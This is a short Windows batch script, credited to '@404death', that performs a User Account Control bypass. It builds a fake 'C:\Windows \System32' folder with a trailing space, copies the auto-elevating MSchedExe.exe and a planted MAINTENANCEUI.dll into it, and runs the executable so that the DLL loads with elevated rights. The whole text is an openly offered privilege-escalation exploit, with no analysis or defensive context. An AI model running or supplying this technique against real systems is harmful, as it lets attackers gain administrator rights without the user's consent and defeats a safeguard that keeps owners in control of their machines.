@echo off
echo.
echo #### UAC Bypass In The Wild By @404death ####
mkdir "\\?\C:\Windows " 
mkdir "\\?\C:\Windows \System32"
echo  [+] file copying ...
copy "C:\Windows\System32\MSchedExe.exe" "C:\Windows \System32\"
echo  [+] file copying ...
copy "MAINTENANCEUI.dll" "C:\Windows \System32\"
"C:\Windows \System32\MSchedExe.exe"
echo  [-] UAC Bypassed ?
